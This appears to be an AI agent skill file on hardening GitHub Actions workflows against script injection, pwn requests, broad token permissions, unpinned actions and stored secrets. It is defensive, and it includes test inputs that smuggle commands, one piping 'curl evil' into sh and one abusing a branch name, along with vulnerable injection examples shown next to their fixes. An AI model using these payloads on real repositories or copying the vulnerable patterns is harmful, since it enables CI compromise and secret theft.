---
name: workflow-hardening
description: Hardens GitHub Actions workflows against script injection, pwn requests, over-broad GITHUB_TOKEN permissions, unpinned or outdated actions and long-lived secrets, using the platform as it is in late 2026 (actions/checkout v7 fork-PR blocking, the pull_request_target default policy, Node 24 actions, npm trusted publishing with OIDC). Use when writing, reviewing or fixing any .github/workflows/*.yml file; when a workflow uses issues, issue_comment, pull_request_target or workflow_run triggers; when checkout refuses to check out fork pull request code; when asked to pin actions to SHAs, set least-privilege permissions, publish to npm or deploy to a cloud from CI without stored tokens, or make a release workflow safe.
license: MIT
---

# GitHub Actions workflow hardening

A workflow is a program that runs with a credential (`GITHUB_TOKEN`, secrets, OIDC) on input that
strangers control (issue titles, PR branches, fork code). Every rule below is about keeping those two
apart. Apply them to every workflow you write or touch, not only when asked about security.

## What changed recently (verify against this, not against memory)

As of 2026-11-01:

| Change | Consequence for your edit |
| --- | --- |
| `actions/checkout` v7.0.0 (2026-06-18) refuses to check out fork PR head or merge commits in `pull_request_target` and in `workflow_run` runs triggered by PRs. Backported 2026-07-20 to v2.8.0, v3.7.0, v4.4.0, v5.1.0, v6.1.0. Opt-out input: `allow-unsafe-pr-checkout: true`. | The error "refusing to check out fork pull request code" is a security control. The fix is to stop checking out PR code in the privileged job, never to add the opt-out (see [privileged triggers](references/privileged-triggers.md)). SHA pins to older releases (e.g. v4.3.x, v6.0.x) are **not** protected. |
| GitHub added a default Actions event policy that blocks `pull_request_target` in public repositories without an explicit event policy. It runs in evaluate mode now and is enforced on **2026-12-02** for affected repositories. | Prefer `pull_request`. Keep `pull_request_target` only for label/comment/status automation that never runs PR code, and tell the user an event policy (Settings > Actions > Policies) must allow it. |
| Since 2025-12-08, `pull_request_target` always takes the workflow file and checkout commit from the **default branch**; `GITHUB_REF` is the default branch. | A plain `actions/checkout` (no `ref:`) in `pull_request_target` checks out trusted default-branch code. |
| Runners run JavaScript actions on Node 24 by default since 2026-06-16; removal of Node 20 from the runner was scheduled for 2026-09-23. | Use action majors built for node24: checkout v5+, setup-node v5+, github-script v8+. |
| npm trusted publishing (OIDC) needs npm CLI >= 11.5.1 and Node >= 22.14.0, `id-token: write`, a GitHub-hosted runner, and `repository.url` in package.json matching the repo exactly. | Node 22 images ship npm 10.x and fail. Use Node 24 (ships npm 11) or upgrade npm in the job. No `NODE_AUTH_TOKEN`, no `NPM_TOKEN`. See [npm trusted publishing](references/npm-trusted-publishing.md). |
| Workflow dependency lockfiles (`gh actions-lock`, `.github/workflows/actions.lock`, public preview) pin every action including transitive ones. | Use them when the repo has adopted them. Otherwise SHA pinning in the YAML is the baseline. |

Current releases (2026-11-01): `actions/checkout` v7.0.1, `actions/setup-node` v7.1.0,
`actions/github-script` v9.0.0, `actions/cache` v6.1.0, `actions/upload-artifact` v7.0.2,
`actions/download-artifact` v8.0.2. Commit SHAs are in [pinning](references/pinning.md); re-resolve
them if the date has moved on.

Breaking changes that bite when upgrading:

- `setup-node` v7 removed the dummy `NODE_AUTH_TOKEN` it used to export when `registry-url` was set
  (Yarn 1 and old npm may now fail without a token; OIDC publishing is unaffected). v6 removed the
  `always-auth` input. v5 turned on dependency caching automatically when package.json declares npm in
  `packageManager` or `devEngines.packageManager`: set `package-manager-cache: false` in any job that
  publishes, deploys or holds secrets.
- `github-script` v9: `require('@actions/github')` no longer works; use the injected `getOctokit`.
  Declaring `const getOctokit = ...` is now a SyntaxError.
- `checkout` v6 stores persisted credentials in a file under `$RUNNER_TEMP`, not in `.git/config`;
  they are still usable by later steps, so `persist-credentials: false` still matters.

## Procedure for any workflow edit

1. **Inventory triggers.** Mark the workflow *privileged* if it runs on `pull_request_target`,
   `workflow_run`, `issue_comment`, `issues`, `discussion*`, `pull_request_review*` or `push` to a
   release ref, or if it has secrets, OIDC or a write token. Privileged workflows get every rule below.
2. **Trace untrusted data.** List every `${{ }}` that expands event data. Anything a non-collaborator
   can type is untrusted (titles, bodies, comments, branch names, commit messages, labels, emails,
   names, fork code, artifacts and caches written by PR runs).
3. **Set permissions.** `permissions: {}` (or `contents: read`) at the top, then the minimum per job.
4. **Pin and update actions.** Full commit SHA plus `# vX.Y.Z`, current major.
5. **Remove stored credentials** where OIDC exists (npm, PyPI, AWS, GCP, Azure, Vault).
6. **Check behaviour still works.** Hardening that breaks the workflow gets reverted by the next person.
   Simulate the risky inputs mentally: a title of `"; curl evil | sh; echo "`, a branch named
   `x";echo${IFS}pwned;#`, an issue with an empty (null) body.
7. If `zizmor` or `actionlint` is installed, run `zizmor --offline .github/workflows/` and `actionlint`
   and fix what they report. Don't install tools without asking.

## Rule 1: never expand untrusted text into code

Expressions are substituted into the script text **before** the shell or JavaScript runs, so quoting
inside the script does not help. Single quotes, double quotes, heredocs, `String.raw`, template
literals and `toJSON()` are all breakable.

```yaml
# Vulnerable: the PR title becomes shell source.
- run: |
    if [[ ! "${{ github.event.pull_request.title }}" =~ ^(feat|fix|docs|chore)(\(.+\))?:\  ]]; then
      echo "::error::Use a Conventional Commits title"; exit 1
    fi

# Fixed: the title is data in an environment variable; the script text is constant.
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    pattern='^(feat|fix|docs|chore)(\(.+\))?: '
    if [[ ! "$PR_TITLE" =~ $pattern ]]; then
      echo "::error::Use a Conventional Commits title"; exit 1
    fi
```

```yaml
# Vulnerable: the comment becomes JavaScript source. A `"` in it ends the string and the rest runs
# as code; an ordinary comment containing a quote or a newline is a SyntaxError.
- uses: actions/github-script@...
  with:
    script: |
      const text = "${{ github.event.comment.body }}"
      if (text.startsWith('/assign-me')) { /* ... */ }

# Fixed: read the event payload at runtime. Bodies can be null.
- uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
  with:
    script: |
      const text = context.payload.comment.body ?? ''
      if (text.startsWith('/assign-me')) { /* ... */ }
```

Rules of thumb:

- Untrusted: any `github.event.*` field ending in `title`, `body`, `message`, `name`, `email`,
  `label`, `ref`, `head_ref`, `default_branch`, `page_name`; `github.head_ref`; whole objects
  (`toJSON(github.event.pull_request)`); step outputs derived from them; artifact contents.
- Safe to inline: numbers (`github.event.issue.number`), `github.repository`, `github.sha`,
  `github.run_id`, logins (restricted character set), values you validated into a step output with a
  strict pattern.
- `if:` conditions, `with:` inputs and `env:` values are evaluated as data, not code: put untrusted
  values there.
- Writing untrusted text to `$GITHUB_ENV` or `$GITHUB_OUTPUT` can inject extra variables via newlines.
  Avoid it; if needed, use the `name<<DELIMITER` form with a random delimiter
  (`d="EOF_$(openssl rand -hex 16)"`) and never write to `GITHUB_ENV` from PR-controlled data at all.
- `issue_comment` slash-command bots: check `github.event.comment.author_association` (`OWNER`,
  `MEMBER`, `COLLABORATOR`) before acting, and never check out the PR the comment is on in that job.

More sinks and payloads to test with: [injection](references/injection.md).

## Rule 2: privileged triggers never run pull request code

Pick the trigger by what the job needs:

| Need | Use |
| --- | --- |
| Build/test PR code, no secrets, read-only token is fine | `pull_request` (fork PRs get a read-only token and no secrets automatically) |
| Label, comment, assign, set a status from PR **metadata** on fork PRs | `pull_request_target` with **no checkout of PR code**: payload fields via `env:` or `context.payload`, file lists via the API |
| Run PR code, then write results back (comment with coverage, upload a preview) | `pull_request` job uploads an artifact; a separate `workflow_run` job downloads it and treats it as untrusted data (validate the PR number, never execute or `source` it, never `unzip` into the workspace over trusted files) |

When `pull_request_target` or a PR-triggered `workflow_run` checks out
`github.event.pull_request.head.sha`, `refs/pull/N/merge`, `github.head_ref` or the fork repository
and then runs anything from it (`npm ci` lifecycle scripts, `make`, `node scripts/x.js`, test runners,
even a linter config), the fork controls a job that holds a write token. On checkout v7 this fails
loudly. Fix it like this:

1. Remove `ref:`/`repository:` from the checkout (or remove the checkout entirely if the job only needs
   payload fields). The job then runs reviewed default-branch code.
2. Get PR facts from the payload (`additions`, `deletions`, `changed_files`, `author_association`,
   `user.login`) or the API (`gh pr diff "$PR" --name-only`, `github.rest.pulls.listFiles`), not from a
   working copy of the fork.
3. Keep the trigger: switching a labeller to `pull_request` silently stops it working for forks
   because their token is read-only.
4. Do not add `allow-unsafe-pr-checkout: true`, downgrade checkout to a pre-July-2026 SHA, or fetch the
   PR with `git fetch origin pull/N/head` / `gh pr checkout` instead. All three reopen the hole.

`allow-unsafe-pr-checkout: true` is acceptable only when the checked-out tree is read as data and no
step executes anything from it, and even then the API is usually simpler. If you use it, say so to the
user and explain why it is safe.

Also: `pull_request_target` runs get read-only access to the default branch's cache (saves fail with a
warning), and their caches must never be restored into release jobs. Details and patterns:
[privileged triggers](references/privileged-triggers.md).

## Rule 3: least-privilege `GITHUB_TOKEN`

Declaring any permission sets every unlisted scope to `none`. Never rely on the repository default,
which may be read/write.

```yaml
permissions: {}            # workflow default: nothing

jobs:
  label:
    permissions:
      pull-requests: write # labels and comments on PRs
  release:
    permissions:
      contents: write      # create the GitHub release, push tags
```

| Job does | Grant |
| --- | --- |
| Check out a private repo | `contents: read` (public repos work without it, keep it for portability) |
| Add labels / comment on an issue | `issues: write` |
| Add labels / comment on a PR | `pull-requests: write` (the REST issues endpoints also accept `issues: write`) |
| Create a release, push a tag or commit | `contents: write` |
| OIDC to npm, PyPI, a cloud | `id-token: write` (it has no `read` level) |
| Build provenance with `actions/attest` | `id-token: write`, `attestations: write`, `artifact-metadata: write` |
| Push to GHCR | `packages: write` |
| Deploy Pages | `pages: write`, `id-token: write` |
| Upload SARIF | `security-events: write` |

Avoid `write-all`, `read-all` in privileged workflows and `secrets: inherit` in reusable-workflow
calls (pass the named secrets the callee needs). Split a job when one step needs a write scope and the
others run third-party code or PR-controlled input.

## Rule 4: pin actions to full commit SHAs

Tags can be moved by whoever controls the action's repository; a commit SHA cannot.

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

- Resolve a tag to its commit: `git ls-remote --tags https://github.com/actions/checkout 'v7.0.1*'`
  and take the `^{}` line if the tag is annotated, or
  `gh api repos/actions/checkout/commits/v7.0.1 --jq .sha`. Never invent or recall a SHA from memory;
  if you cannot resolve one, reuse a pin that already exists in the repo or tell the user.
- The SHA must be reachable from a tag in the action's own repository. GitHub serves commits from the
  whole fork network under the upstream name, so a SHA copied from a blog or a fork can be an
  impostor commit.
- Keep the version comment accurate: Dependabot (`package-ecosystem: github-actions`) updates both
  the SHA and the comment. Dependabot *alerts* do not fire for SHA pins, so keep version updates on.
- Reusable workflows from other repositories (`jobs.<id>.uses: org/repo/.github/workflows/x.yml@...`)
  are pinned the same way.
- Use current majors. On github.com, `upload-artifact`/`download-artifact` v3 and older are retired
  (GHES is the exception), `actions/cache` releases older than v3.4.0 / v4.2.0 fail against the cache
  service introduced in February 2025, and actions that declare `node20` are run on Node 24 by the
  runner since 2026-06-16, so prefer majors built for node24.

How to look up current SHAs, the table as of 2026-11-01 and lockfile notes: [pinning](references/pinning.md).

## Rule 5: no long-lived credentials where OIDC exists

- **npm**: trusted publishing. Configure it on npmjs.com (owner, repository, workflow *file name*,
  optional environment), then publish with `id-token: write` and no token at all. Provenance is
  generated automatically for public repos and packages. Full workflow and failure modes:
  [npm trusted publishing](references/npm-trusted-publishing.md).
- **Clouds**: `aws-actions/configure-aws-credentials` (`role-to-assume`, `aws-region`),
  `google-github-actions/auth` (`workload_identity_provider`, `service_account`), `azure/login`
  (`client-id`, `tenant-id`, `subscription-id`), all with `id-token: write`. Scope the cloud-side trust
  policy to the repository **and** the ref or environment (`repo:org/name:environment:production`),
  never to `repo:org/*`. Snippets: [OIDC for clouds](references/oidc-clouds.md).
- Gate production credentials behind an `environment:` with required reviewers.
- Cross-repo automation: a GitHub App token (`actions/create-github-app-token`) scoped to the repos it
  needs, not a personal access token.
- Never echo secrets, never put JSON blobs in one secret, and register derived values (base64 of a
  secret) with `::add-mask::`.

## Rule 6: release and deploy jobs

- Trigger on tags (`push: tags: ['v[0-9]+.[0-9]+.[0-9]+']`) or `release: published`, never on
  `pull_request*`. Pushes to branches must not publish.
- Run the tests in the release workflow (or `needs:` a job that does) before publishing.
- No dependency caches in jobs that publish or deploy (`package-manager-cache: false`, no
  `actions/cache` restore): a cache written by a less trusted run is code you execute with your
  publish credential.
- `persist-credentials: false` on checkout unless a later step pushes with git.
- `concurrency: { group: release, cancel-in-progress: false }` so two tags never publish at once and
  a publish is never cancelled half-way.
- Separate jobs for separate credentials: `id-token: write` in the publish job, `contents: write` in
  the job that creates the GitHub release.

## Rule 7: everything else that shows up in review

- Self-hosted runners almost never belong in public repositories; any PR can run on them.
- `timeout-minutes` on long jobs; default is 360.
- Don't hide failures with `continue-on-error: true` on security-relevant steps.
- `workflow_dispatch` inputs are typed by collaborators but still flow into shells: pass them via
  `env:` too.
- Add `.github/workflows/` to CODEOWNERS so workflow changes need a maintainer's review.

## Review checklist

- [ ] No `${{ }}` with untrusted data inside `run:` or `github-script` `script:`.
- [ ] Privileged triggers never check out, fetch or execute PR code; no `allow-unsafe-pr-checkout`.
- [ ] `permissions` declared; every write scope is used by that job.
- [ ] Every remote `uses:` is a real full-length SHA with a matching version comment, on a node24 major.
- [ ] No stored npm/cloud tokens where OIDC works; no `secrets: inherit`.
- [ ] Release jobs: tag trigger, tests first, no caches, split credentials, GitHub-hosted runner.
- [ ] The workflow still does its job for the inputs it will really see (forks, empty bodies, odd
      branch names).

## References

- [Injection sinks and test payloads](references/injection.md)
- [Privileged triggers: pull_request_target, workflow_run, issue_comment](references/privileged-triggers.md)
- [Pinning, current SHAs and lockfiles](references/pinning.md)
- [npm trusted publishing](references/npm-trusted-publishing.md)
- [OIDC for AWS, Google Cloud and Azure](references/oidc-clouds.md)
- [Sources](references/sources.md)
